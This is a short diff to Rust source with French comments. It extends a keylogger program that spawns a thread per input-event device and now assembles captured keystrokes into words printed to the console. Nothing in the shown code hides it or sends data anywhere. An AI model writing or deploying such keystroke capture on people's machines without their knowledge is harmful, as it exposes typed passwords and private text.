@@ -28,15 +28,33 @@ fn main() {
 
     let mut handles = vec![];
 
-    // Pour chaque chemin dans event_paths, lancer un thread
+    // Pour chaque chemin dans event_paths, lancer un thread=
     for path_str in event_paths {
         let path = Path::new(&path_str).to_path_buf(); // Crée une copie du chemin pour chaque thread
         let keycode_map = keycode_map.clone(); // Clone le keycode_map pour chaque thread
 
         let handle = thread::spawn(move || {
+            let mut word: String = String::new();
             loop {
-                if let Some(letter) = keylogger::get_pressed_key(&path, &keycode_map) {
-                    println!("{}", letter); // Affiche la lettre récupérée
+                if let Some(mut letter) = keylogger::get_pressed_key(&path, &keycode_map) {
+                    letter = letter.to_lowercase(); // Convertir la lettre en minuscule
+
+                    // Vérifier si la lettre contient un seul caractère et si ce caractère est alphabétique
+                    if letter.chars().count() == 1 {
+                        // Vérifier explicitement si le premier caractère est une lettre
+                        if let Some(first_char) = letter.chars().next() {
+                            if first_char.is_alphabetic() || "éèàùç'ù".contains(first_char) {
+                                word.push_str(&letter); // Ajouter la lettre au mot
+                            } else {
+                                word.clear(); // Si ce n'est pas une lettre, on vide le mot
+                            }
+                        }
+                        // TODO: détecter les clics de la souris pour clear aussi
+                    } else {
+                        word.clear(); // Si la lettre n'est pas une seule lettre, on vide le mot
+                    }
+
+                    println!("{}", word); // Affiche le mot formé
                 }
                 // Pour éviter une surcharge inutile du CPU
                 thread::sleep(std::time::Duration::from_millis(10));
